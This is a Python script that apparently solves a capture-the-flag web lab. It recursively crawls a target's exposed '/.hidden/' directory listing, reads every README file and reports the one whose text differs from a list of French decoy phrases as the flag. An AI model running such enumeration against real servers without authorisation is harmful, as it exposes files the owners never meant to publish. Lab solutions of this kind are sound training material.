#!/usr/bin/python3

import sys
import requests
import time
from bs4 import BeautifulSoup

# ANSI Colors
RED = "\033[31m"
GREEN = "\033[32m"
BLUE = "\033[34m"
RESET = "\033[0m"

# READMEs' contents. Gathered from trial-and-error
KNOWN_PHRASES = [
    "Demande ton voisin du dessus  \n",
    "Demande à ton voisin du dessus  \n",
    "Demande ton voisin du dessous \n",
    "Demande à ton voisin du dessous \n",
    "Demande ton voisin de droite  \n",
    "Demande à ton voisin de droite  \n",
    "Demande à ton voisin de gauche  \n",
    "Toujours pas tu vas craquer non ?\n",
    "Tu veux de l'aide ? Moi aussi !  \n",
    "Non ce n'est toujours pas bon ...\n",
]

def is_valid_ip(ip: str) -> bool:
    """
    Checks if a string has a valid IP address representation.

    Args:
        ip (str): String, supposed to contain an IP address, to validate
    
    Returns:
        bool: Whether `ip` is a valid IP address
    """

    try:
        parts = ip.split('.')
        return len(parts) == 4 and all(0 <= int(part) <= 255 for part in parts)
    except (AttributeError, TypeError, ValueError):
        return False

def walk_dir(dir_url: str) -> None:
    """
    Walks a directory in a directory listing page, walking recursively when finding
    links for more directories.

    Args:
        dir_url (str): URL of the directory to walk
    """

    req = requests.get(dir_url)
    if req.status_code != 200:
        print(f"{RED}[x]{RESET} Server returned status code {req.status_code}")
        return

    html = str(req.content)
    soup = BeautifulSoup(html, 'html.parser')

    links = soup.find_all('a')
    print(f"{BLUE}[i]{RESET} Walking {dir_url}")
    for link in links:
        if not link["href"]:
            print(f"{RED}[!]{RESET} Found link without href under {dir_url}")
            continue

        if link["href"] == "../":
            continue
        
        if link["href"] == "README":
            print(f"{BLUE}[i]{RESET} Found README under {dir_url}")
            req = requests.get(dir_url + link["href"])
            content = req.content.decode('utf-8')

            if content not in KNOWN_PHRASES:
                print(f"{GREEN}[+]{RESET} Flag found: {content}")
                sys.exit(0)

        if len(links) == 2:
            return

        time.sleep(0.01) # throttle to prevent running out of ephemeral ports
        walk_dir(dir_url + link["href"])

def main():
    if len(sys.argv) != 2:
        print(f"{RED}[x]{RESET} Invalid number of arguments, expected 1 got {len(sys.argv) - 1}", file=sys.stderr)
        sys.exit(1)
        
    target_ip = sys.argv[1]
    if len(target_ip) == 0 or not is_valid_ip(target_ip):
        print(f"{RED}[x]{RESET} Invalid target IP", file=sys.stderr)
        sys.exit(1)
    
    walk_dir(f"http://{target_ip}/.hidden/")

if __name__ == '__main__':
    main()
